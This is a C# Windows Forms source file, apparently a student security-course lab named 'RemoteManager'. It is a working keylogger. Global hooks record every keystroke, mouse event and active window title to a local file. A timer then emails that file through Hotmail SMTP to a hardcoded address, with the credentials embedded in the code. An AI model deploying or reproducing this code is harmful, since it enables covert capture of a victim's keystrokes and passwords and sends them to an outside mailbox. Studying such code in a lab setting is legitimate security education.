using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;

namespace Pruebas
{
    public partial class Test : Form
    {
        private int y = 0;
        private int velocity = 5;
        private int x = 0;
        private WQLUtil.Util.Window.WindowManager w;
        private WQLUtil.Util.Mouse.MouseManager m;

        
        public Test()
        {
            InitializeComponent();
            w = new WQLUtil.Util.Window.WindowManager(WinEventProc);
            m = new WQLUtil.Util.Mouse.MouseManager();
                 
            m.Hook.OnMouseActivity += new MouseEventHandler(MouseMoved);
            m.Hook.KeyDown += new KeyEventHandler(ExtKeyDown);
            m.Hook.KeyPress += new KeyPressEventHandler(ExtKeyPress);
            m.Hook.KeyUp += new KeyEventHandler(ExtKeyUp);
        }

        private void Log(string txt)
        {
            Console.WriteLine("{0}", txt);

        }

        public void MouseMoved(object sender, MouseEventArgs e)
        {
            x = e.X;
            y = e.Y;

            Console.WriteLine(String.Format("x = {0},  y= {1}, delta = {2}", e.X, e.Y, e.Delta));
            escribirenArchivo(String.Format("x = {0},  y= {1}, delta = {2}", e.X, e.Y, e.Delta));

            if (e.Clicks > 0) 
                Log("MouseButton - " + e.Button.ToString());
                escribirenArchivo("MouseButton - " + e.Button.ToString());
        }

        public void ExtKeyDown(object sender, KeyEventArgs e)
        {
            Log("KeyDown - " + e.KeyData.ToString());
            escribirenArchivo("KeyDown - " + e.KeyData.ToString());
            WQLUtil.Util.Mouse.MouseManager.SetCursor(x, y);
            if (e.KeyValue == 73)
            {
                WQLUtil.Util.Mouse.MouseManager.LeftClickExt(x, y);
                Console.WriteLine("Clic izquierdo");
                escribirenArchivo("Clic izquierdo");
            }
            else if (e.KeyValue == 68)
            {
                WQLUtil.Util.Mouse.MouseManager.RightClick(x, y);
                Console.WriteLine("Clic derecho");
                escribirenArchivo("Clic derecho");
            }
            else if (e.KeyValue == 39)
                x = x + velocity;
            else if (e.KeyValue == 40)
                y = y + velocity;
            else if (e.KeyValue == 37)
                x = x - velocity;
            else if (e.KeyValue == 38)
                y = y - velocity;
            else if (e.KeyValue == 77)
                WQLUtil.Util.Window.WindowManager.MinAll();
            else if (e.KeyValue == 78)
                WQLUtil.Util.Window.WindowManager.MaxAll();
            
            Console.WriteLine("x={0}, y={1}, Key = {2}", x, y, e.KeyValue);
            escribirenArchivo("x={0}, y={1}, Key = {2}"+ x+ y+ e.KeyValue);

        }

        public void ExtKeyPress(object sender, KeyPressEventArgs e)
        {
            Log("KeyPress 	- " + e.KeyChar);
            escribirenArchivo("KeyPress 	- " + e.KeyChar);
        }

        public void ExtKeyUp(object sender, KeyEventArgs e)
        {
            Log("KeyUp - " + e.KeyData.ToString());
            escribirenArchivo("KeyUp - " + e.KeyData.ToString());
        }

        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            Log("Active Window - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + "\r\n");
            escribirenArchivo("Active Window - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + "\r\n");
        }


        private void Test_Load(object sender, EventArgs e)
        {

        }

        public void escribirenArchivo(string data)
        {
            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\Users\alefr\Documents\Alessandra\MSICU\3Semestre\Fundamentos de Seguridad\Lab5 - RemoteManager\Lab5 - RemoteManager\Pruebas\Archivo.txt", true))
            {
                file.WriteLine(data);
                file.Dispose();
            }

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Console.WriteLine("Enviar mensaje");            
            enviarCorreo();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            int intervalo = Int32.Parse(textBox2.Text);
            intervalo = 6000;
            timer1.Interval = intervalo;
            timer1.Enabled = true;
            timer1.Start();
        }

        private void enviarCorreo()
        {
            MailMessage _correo = new MailMessage();

            String correo = textBox1.Text;
            correo = "alefrai_15@hotmail.com";

            _correo.From = new MailAddress("alefrai_15@hotmail.com");
            _correo.To.Add(correo);
            _correo.Subject = "Reporte";
            _correo.IsBodyHtml = true;
            _correo.Body = "este es el cuerpo prueba saludos";
            _correo.Priority = MailPriority.Normal;
            Attachment _attachement = new Attachment("C:/Users/alefr/Documents/Alessandra/MSICU/3Semestre/Fundamentos de Seguridad/Lab5 - RemoteManager/Lab5 - RemoteManager/Pruebas/Archivo.txt");
            _correo.Attachments.Add(_attachement);

            SmtpClient smtp = new SmtpClient("smtp.live.com");
            smtp.Port = 587;
            smtp.UseDefaultCredentials = false;

            smtp.Credentials = new NetworkCredential("alefrai_15@hotmail.com", "contasenia");
            smtp.EnableSsl = true;
            //smtp.Timeout = 7000;

            try
            {
                smtp.Send(_correo);
                // MessageBox.Show("Correo enviado");
                Console.Write("se envio el mail");
            }
            catch (Exception ex)
            {
                /// MessageBox.Show("No se pudo Enviar el Correo");
                Console.Write("no se envio el mail: " + ex);
            }
            _correo.Dispose();



        }

    }
}
